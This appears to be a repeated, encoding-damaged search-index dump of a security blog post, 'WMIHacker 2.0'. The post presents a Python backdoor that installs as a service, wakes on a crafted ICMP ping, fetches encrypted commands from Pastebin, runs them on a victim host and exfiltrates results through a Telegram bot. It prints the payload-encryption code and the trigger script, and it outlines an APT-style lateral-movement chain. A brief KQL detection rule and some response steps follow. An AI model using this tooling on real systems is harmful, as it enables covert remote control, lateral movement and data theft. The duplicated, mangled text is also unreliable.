payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 